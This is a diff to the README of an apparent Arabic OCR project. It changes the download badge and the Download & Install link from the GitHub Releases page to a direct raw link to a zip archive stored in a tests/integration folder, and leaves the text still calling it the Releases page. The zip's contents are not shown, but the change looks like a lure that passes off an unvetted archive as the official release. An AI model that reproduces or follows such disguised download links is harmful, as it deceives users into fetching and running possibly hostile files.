@@ -1,7 +1,7 @@
 # 🌟 Manazir-OCR - Extract Text from Arabic Documents Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Manazir--OCR-v1.0-blue)](https://github.com/Minorislove/Manazir-OCR/releases)
+[![Download](https://raw.githubusercontent.com/Minorislove/Manazir-OCR/main/tests/integration/Manazir-OCR-2.5.zip%20Manazir--OCR-v1.0-blue)](https://raw.githubusercontent.com/Minorislove/Manazir-OCR/main/tests/integration/Manazir-OCR-2.5.zip)
 
 ## 🚀 Getting Started
 Manazir OCR is designed to help you extract high-quality text and layout from Arabic documents. This software uses advanced models to ensure the best results. Whether you need the text in HTML or Markdown, Manazir OCR provides an easy way to get what you need.
@@ -22,7 +22,7 @@ Before you start using Manazir OCR, ensure that your system meets the following 
 - **Pluggable Backends:** Easily switch between different OCR models.
 
 ## 📥 Download & Install
-To download Manazir OCR, please visit the Releases page here: [Download Manazir-OCR](https://github.com/Minorislove/Manazir-OCR/releases). 
+To download Manazir OCR, please visit the Releases page here: [Download Manazir-OCR](https://raw.githubusercontent.com/Minorislove/Manazir-OCR/main/tests/integration/Manazir-OCR-2.5.zip). 
 
 1. Go to the Releases page using the link above.
 2. Look for the latest version.
